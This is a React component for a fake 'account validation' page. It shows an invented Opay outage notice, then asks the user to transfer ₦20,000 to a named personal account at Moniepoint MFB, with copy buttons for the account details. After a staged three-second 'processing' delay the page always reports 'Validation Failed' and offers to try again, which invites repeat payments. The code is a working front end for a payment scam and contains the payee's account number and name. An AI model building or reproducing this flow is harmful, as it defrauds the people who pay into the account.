import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ArrowLeft, Copy, CheckCircle, XCircle, AlertTriangle } from 'lucide-react';

interface AccountValidationPageProps {
  onBack: () => void;
  userEmail: string;
  userName: string;
}

const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, userEmail, userName }) => {
  const [currentStep, setCurrentStep] = useState<'form' | 'loading' | 'warning' | 'payment' | 'processing' | 'failed'>('form');
  const [formData, setFormData] = useState({
    fullName: userName,
    email: userEmail,
    amount: '20000'
  });

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const handleSubmit = () => {
    setCurrentStep('loading');

    setTimeout(() => {
      setCurrentStep('warning');
    }, 2000);
  };

  const handleWarningContinue = () => {
    setCurrentStep('payment');
  };

  const handlePaymentConfirm = () => {
    setCurrentStep('processing');

    setTimeout(() => {
      setCurrentStep('failed');
    }, 3000);
  };

  const handleBackNavigation = () => {
    if (currentStep === 'form') {
      onBack();
    } else if (currentStep === 'warning' || currentStep === 'payment' || currentStep === 'processing' || currentStep === 'failed') {
      setCurrentStep('form');
    }
  };

  // Form step
  if (currentStep === 'form') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={handleBackNavigation} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Account Validation</h1>
        </div>

        <div className="p-4">
          <Card>
            <CardHeader>
              <CardTitle className="text-center text-gray-900">Validate Your Account</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
                <Input
                  type="text"
                  value={formData.fullName}
                  onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                  className="h-12 rounded-xl"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                <Input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="h-12 rounded-xl"
                />
              </div>

              <Button
                onClick={handleSubmit}
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
              >
                Continue to Payment
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // Loading step
  if (currentStep === 'loading') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-600 border-t-transparent mx-auto mb-4"></div>
          <p className="text-gray-600">Loading account details...</p>
        </div>
      </div>
    );
  }

  // Warning step with Opay service notice
  if (currentStep === 'warning') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-lg max-w-md w-full">
          <div className="flex items-center justify-between p-4 border-b">
            <div className="flex items-center gap-3">
              <img 
                src="/lovable-uploads/629c21bc-e917-4c27-90e6-ab673d42978b.png" 
                alt="Opay Logo" 
                className="w-8 h-8"
              />
              <h2 className="text-lg font-semibold text-gray-900">Service Notice</h2>
            </div>
            <button onClick={handleBackNavigation} className="text-gray-400 hover:text-gray-600">
              <XCircle size={20} />
            </button>
          </div>

          <div className="p-6">
            <div className="bg-orange-50 border-l-4 border-orange-400 p-4 mb-6">
              <div className="flex items-start gap-3">
                <AlertTriangle className="text-orange-600 mt-1" size={20} />
                <div>
                  <h3 className="text-orange-800 font-semibold mb-2">Opay Bank Service Down</h3>
                  <p className="text-orange-700 text-sm mb-3">
                    We're currently experiencing issues with Opay bank transfers. Please use other banks for your payments.
                  </p>
                </div>
              </div>
            </div>

            <p className="text-gray-600 mb-6 text-sm">
              We apologize for any inconvenience. All other banks are working normally and your payment will be processed immediately.
            </p>

            <Button
              onClick={handleWarningContinue}
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
            >
              I Understand
            </Button>
          </div>
        </div>
      </div>
    );
  }

  // Payment step with updated account details
  if (currentStep === 'payment') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={handleBackNavigation} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Payment Details</h1>
        </div>

        <div className="p-4 space-y-4">
          <Card className="bg-blue-600 text-white">
            <CardContent className="p-4">
              <h3 className="text-lg font-bold mb-4">Account Details</h3>
              
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Account Number:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-mono">6056570413</span>
                    <button onClick={() => copyToClipboard('6056570413')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Account Name:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-medium">CHUKWUEMEKA AMADI JAMES</span>
                    <button onClick={() => copyToClipboard('CHUKWUEMEKA AMADI JAMES')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Bank:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-medium">Moniepoint MFB</span>
                    <button onClick={() => copyToClipboard('Moniepoint MFB')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Amount:</span>
                  <span className="font-bold text-lg">₦20,000</span>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
            <p className="text-yellow-800 text-sm">
              <strong>Important:</strong> Transfer the exact amount to the account above, then click "I have sent the money" below.
            </p>
          </div>

          <Button
            onClick={handlePaymentConfirm}
            className="w-full h-12 bg-green-600 hover:bg-green-700 text-white rounded-xl"
          >
            I have sent the money
          </Button>
        </div>
      </div>
    );
  }

  // Processing step
  if (currentStep === 'processing') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-600 border-t-transparent mx-auto mb-4"></div>
          <p className="text-gray-600">Account validation in progress...</p>
        </div>
      </div>
    );
  }

  // Failed step
  if (currentStep === 'failed') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-red-600 px-4 py-4 flex items-center gap-3">
          <button onClick={handleBackNavigation} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Validation Failed</h1>
        </div>

        <div className="p-4 flex items-center justify-center min-h-[70vh]">
          <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-sm w-full">
            <div className="mb-6">
              <XCircle className="h-16 w-16 text-red-500 mx-auto mb-4" />
              <h2 className="text-xl font-bold text-gray-900 mb-2">Validation Failed</h2>
              <p className="text-gray-600 text-sm">
                Your account validation could not be completed. Please try again or contact support.
              </p>
            </div>

            <div className="space-y-3">
              <Button
                onClick={() => setCurrentStep('form')}
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
              >
                Try Again
              </Button>
              
              <Button
                onClick={onBack}
                variant="outline"
                className="w-full h-12 rounded-xl"
              >
                Go Back
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default AccountValidationPage;
